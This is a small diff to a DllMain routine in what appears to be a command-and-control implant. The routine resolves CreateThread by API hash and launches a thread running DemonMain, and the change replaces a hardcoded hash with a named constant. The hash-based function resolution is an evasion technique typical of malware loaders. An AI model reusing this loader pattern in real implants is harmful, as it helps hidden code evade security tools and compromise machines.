@@ -40,9 +40,8 @@ BOOL WINAPI DllMain( HINSTANCE hDllBase, DWORD Reason, LPVOID Reserved )
                 LPVOID,
                 DWORD,
                 LPDWORD
-        ) = LdrFunctionAddr( Kernel32, 0x7f08f451 ); /* this hash is for CreateThread in Kernel32.
-                                                      * you can load another function here using
-                                                      * LdrModulePeb or LdrModuleLoad then LdrFunctionAddr */
+        ) = LdrFunctionAddr( Kernel32, FuncHash_CreateThread ); /* you can load another function here using
+                                                                 * LdrModulePeb or LdrModuleLoad then LdrFunctionAddr */
 
         NewThread( NULL, 0, DemonMain, hDllBase, 0, NULL );
 #endif
